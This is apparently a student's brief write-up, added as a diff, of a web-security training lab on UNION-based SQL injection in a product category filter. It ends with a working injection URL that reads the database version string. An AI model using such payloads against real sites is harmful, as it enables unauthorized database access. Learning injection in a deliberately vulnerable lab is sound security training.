@@ -1,0 +1,14 @@
+ This lab contains an SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
+
+To solve the lab, display the database version string.
+
+
+Hint
+
+You can find some useful payloads on our SQL injection cheat sheet.
+
+url:        https://0acb005004db1ea7c07735b30006004f.web-security-academy.net/filter?category=Gifts
+
+After determine the columns of the table and the data types in each columns we use this payload to retrieve the database version
+
+payload:        https://0acb005004db1ea7c07735b30006004f.web-security-academy.net/filter?category=Gifts'+union+select+@@version,null#
